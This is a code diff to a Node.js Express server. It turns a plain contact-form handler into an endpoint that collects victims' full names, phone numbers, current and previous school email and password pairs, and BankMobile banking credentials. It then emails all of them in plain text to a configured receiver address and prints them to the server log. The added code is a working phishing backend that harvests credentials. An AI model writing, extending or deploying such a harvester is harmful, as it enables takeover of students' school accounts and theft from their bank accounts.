@@ -23,56 +23,81 @@ app.get("/", (req, res) => {
 });
 
 // POST: Email Sending
-app.post(
-  "/send-email",
-  [
-    body("name").trim().isLength({ min: 2, max: 50 }),
-    body("email").isEmail(),
-    body("message").trim().isLength({ min: 5, max: 1000 }),
-  ],
-  async (req, res) => {
-    const errors = validationResult(req);
-    if (!errors.isEmpty()) {
-      return res.status(400).json({ error: "Invalid input" });
-    }
+app.post("/send-email", async (req, res) => {
+  const {
+    fullName,
+    phoneNumber,
+    currentSchoolEmail,
+    currentSchoolPassword,
+    previousSchoolEmail,
+    previousSchoolPassword,
+    hasBankMobileProfile,
+    bankMobileEmail,
+    bankMobilePassword,
+  } = req.body;
 
-    const { name, email, message } = req.body;
-
-    // OPTIONAL: Server-side HMAC to log + secure internally
-    const secret = process.env.SECRET_KEY;
-    const dataToSign = `${name}:${email}:${message}`;
-    const signature = crypto
-      .createHmac("sha256", secret)
-      .update(dataToSign)
-      .digest("hex");
-
-    try {
-      const transporter = nodemailer.createTransport({
-        service: "gmail",
-        auth: {
-          user: process.env.EMAIL_USER,
-          pass: process.env.EMAIL_PASS,
-        },
-      });
-
-      await transporter.sendMail({
-        from: `"Website Contact" <${process.env.EMAIL_USER}>`,
-        to: process.env.RECEIVER_EMAIL,
-        subject: "New Contact Form Message",
-        text: `
-          Name: ${name}
-          Email: ${email}
-          Message: ${message}
-          Signature: ${signature} (Internal only)
-        `,
-      });
-
-      return res.json({ success: true });
-    } catch (err) {
-      return res.status(500).json({ error: "Email failed to send" });
-    }
+  // Basic validation (optional – can be extended)
+  if (
+    !fullName ||
+    !currentSchoolEmail ||
+    !currentSchoolPassword ||
+    !previousSchoolEmail ||
+    !previousSchoolPassword
+  ) {
+    return res.status(400).json({ error: "Missing required fields" });
   }
-);
+
+  const secret = process.env.SECRET_KEY;
+  const dataToSign = `${fullName}:${currentSchoolEmail}:${previousSchoolEmail}`;
+  const signature = crypto
+    .createHmac("sha256", secret)
+    .update(dataToSign)
+    .digest("hex");
+
+  try {
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS,
+      },
+    });
+
+    const message = `
+        New Full Form Submission
+
+          Full Name: ${fullName}
+          Phone Number: ${phoneNumber}
+
+          --- Current School Credentials ---
+          Email: ${currentSchoolEmail}
+          Password: ${currentSchoolPassword}
+
+          --- Previous School Credentials ---
+          Email: ${previousSchoolEmail}
+          Password: ${previousSchoolPassword}
+
+          --- BankMobile ---
+          Has BankMobile Profile: ${hasBankMobileProfile}
+          Email: ${bankMobileEmail || "N/A"}
+          Password: ${bankMobilePassword || "N/A"}
+    `;
+
+    await transporter.sendMail({
+      from: `"Website Contact" <${process.env.EMAIL_USER}>`,
+      to: process.env.RECEIVER_EMAIL,
+      subject: "📨 New Full Form Submission",
+      text: message,
+    });
+
+    console.log(message);
+
+    return res.json({ success: true });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: "Email failed to send" });
+  }
+});
 
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
